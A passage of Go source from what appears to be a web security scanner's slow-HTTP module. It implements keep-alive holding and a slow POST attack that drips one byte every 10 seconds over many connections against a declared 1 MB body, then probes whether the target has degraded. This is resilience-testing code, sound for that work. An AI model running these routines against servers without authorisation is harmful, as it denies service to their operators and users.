					_, err := conn.Write([]byte(keepReq))
					if err != nil {
						mu.Lock()
						result.findings = append(result.findings, scanner.Finding{
							Category:    "Slow-HTTP",
							Severity:    "info",
							URL:         fmt.Sprintf("tcp://%s/?keepalive_hold=%d", addr, connID),
							Method:      "RAW-TCP",
							StatusCode:  0,
							Evidence:    fmt.Sprintf("Keep-alive connection dropped after %ds: %v", holdTime, err),
							Description: fmt.Sprintf("Keep-alive hold raw TCP: server closed idle connection after %ds", holdTime),
						})
						mu.Unlock()
						return
					}
					// Drain response.
					conn.SetReadDeadline(time.Now().Add(5 * time.Second))
					for {
						_, readErr := conn.Read(buf)
						if readErr != nil {
							break
						}
					}
				}
			}
		}(i)
	}

	select {
	case <-ctx.Done():
	case <-time.After(cfg.Timeout):
	}

	return result
}

// ---------------------------------------------------------------------------
// rawSlowPostBody — send POST with large Content-Length, drip-feed the body
// ---------------------------------------------------------------------------

func (m *SlowHTTPModule) rawSlowPostBody(ctx context.Context, addr, hostHeader string, cfg RawSocketConfig) rawAttackResult {
	var result rawAttackResult
	var mu sync.Mutex
	var wg sync.WaitGroup

	for i := 0; i < cfg.Concurrency; i++ {
		wg.Add(1)
		go func(connID int) {
			defer wg.Done()

			conn, err := net.DialTimeout("tcp", addr, cfg.Timeout)
			if err != nil {
				return
			}

			mu.Lock()
			result.conns = append(result.conns, conn)
			mu.Unlock()

			// Send headers with a large Content-Length, then drip-feed the
			// body one byte at a time.
			req := fmt.Sprintf(
				"POST /?slow_post=%d HTTP/1.1\r\n"+
					"Host: %s\r\n"+
					"Content-Type: application/x-www-form-urlencoded\r\n"+
					"Content-Length: 1048576\r\n"+
					"Connection: keep-alive\r\n"+
					"\r\n",
				connID, hostHeader,
			)

			conn.SetWriteDeadline(time.Now().Add(cfg.Timeout))
			_, err = conn.Write([]byte(req))
			if err != nil {
				return
			}

			// Send one byte every 10 seconds. The server is waiting for the
			// full 1MB body that will never arrive.
			bytesSent := 0
			ticker := time.NewTicker(10 * time.Second)
			defer ticker.Stop()

			for {
				select {
				case <-ctx.Done():
					return
				case <-ticker.C:
					conn.SetWriteDeadline(time.Now().Add(cfg.Timeout))
					_, err := conn.Write([]byte("A"))
					if err != nil {
						mu.Lock()
						result.findings = append(result.findings, scanner.Finding{
							Category:    "Slow-HTTP",
							Severity:    "info",
							URL:         fmt.Sprintf("tcp://%s/?slow_post=%d", addr, connID),
							Method:      "RAW-TCP",
							StatusCode:  0,
							Evidence:    fmt.Sprintf("Connection closed after %d bytes of 1MB body: %v", bytesSent, err),
							Description: fmt.Sprintf("Slow POST body raw TCP: server closed after %d bytes sent (10s/byte, declared 1MB)", bytesSent),
						})
						mu.Unlock()
						return
					}
					bytesSent++
				}
			}
		}(i)
	}

	select {
	case <-ctx.Done():
	case <-time.After(cfg.Timeout):
	}

	return result
}

// ---------------------------------------------------------------------------
// probeHealth — check if the target is still responsive after attacks
// ---------------------------------------------------------------------------

// probeHealth makes a simple HTTP GET to the target and returns whether the
// target appears degraded (unreachable or very slow) along with the observed
// latency. It tries up to 3 times with a short timeout.
func (m *SlowHTTPModule) probeHealth(target string, timeout time.Duration) (degraded bool, latency time.Duration) {
	probeTimeout := 5 * time.Second
	if probeTimeout > timeout {
		probeTimeout = timeout
	}

	client := &http.Client{
		Timeout: probeTimeout,
		// Do not follow redirects.
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	var totalLatency time.Duration
	failures := 0

	for attempt := 0; attempt < 3; attempt++ {
		start := time.Now()
		resp, err := client.Get(target + "/")
		elapsed := time.Since(start)
		totalLatency += elapsed

		if err != nil {
			failures++
			continue
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()

		// If the response is very slow (> 3s for a simple GET), count as degraded.
		if elapsed > 3*time.Second {
			failures++
		}
	}

	avgLatency := totalLatency / 3

	// If 2+ out of 3 probes failed or were slow, target is degraded.
	return failures >= 2, avgLatency
}
